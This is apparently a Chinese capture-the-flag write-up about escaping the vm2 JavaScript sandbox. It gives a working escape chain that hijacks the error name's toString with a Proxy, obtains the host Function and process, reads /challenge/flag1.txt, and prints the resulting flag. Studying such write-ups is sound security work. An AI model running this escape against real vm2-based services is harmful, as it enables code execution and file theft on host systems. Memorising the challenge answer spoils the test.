## 题目原文

> 某平台基于第三方沙箱组件构建在线 JavaScript 执行服务，脚本在该组件提供的受控环境中运行。已获授权进行安全评估，请在该环境约束下设法读取系统中隐藏的 flag。

## 题解

### 入口与指纹

8000 端口，`X-Powered-By: Express`。`GET /` 写明沙箱是 `nodejs-vm2`。POST `{"code":"..."}`，最多 4096 字符。异常栈里能看到 `/app/node_modules/vm2/lib/vm.js`，用户代码从 `vm.js:2` 开始执行。

### 关键观察

直接走 `Function` 构造器拿不到宿主的 `process`。`this.constructor.constructor("return process")()` 的错误是 `process is not defined`。`Buffer` 存在，但 `Buffer.from("").constructor.constructor("return process")()` 也是同一句错误。vm2 换过了这条构造器链。

`Error.prepareStackTrace` 可以改成返回 `frames`，`e.stack` 变成调用帧数组。帧上有 `getThis` 和 `getFunction`，这次两者都是 `undefined`，`getFileName()` 只是 `vm.js`。调用帧本身不够用。

能用的是异常对象的 `name`。读 `err.stack` 时，宿主会把 `name` 转成字符串。把 `name.toString` 换成一个 `Proxy`，`apply` 陷阱的 `args` 来自宿主调用，`args.constructor.constructor` 才是宿主的 `Function`。

### 利用链

```javascript
const err = new Error();
err.name = {
  toString: new Proxy(function () { return ""; }, {
    apply(target, thiz, args) {
      const process = args.constructor.constructor("return process")();
      throw process.mainModule.require("fs").readFileSync("/challenge/flag1.txt", "utf8");
    }
  })
};
try { void err.stack; } catch (e) { console.log(String(e)); }
```

`readFileSync` 的返回值被 `throw` 出来，外层 `catch` 打到 `console`。本次平台接受的值是 `flag{3173df10-77c4-420e-9fc7-046036198783}`。

### flag 位置

入口容器的 `/challenge/flag1.txt`。读文件发生在 Proxy 陷阱里拿到的宿主 `process` 上。
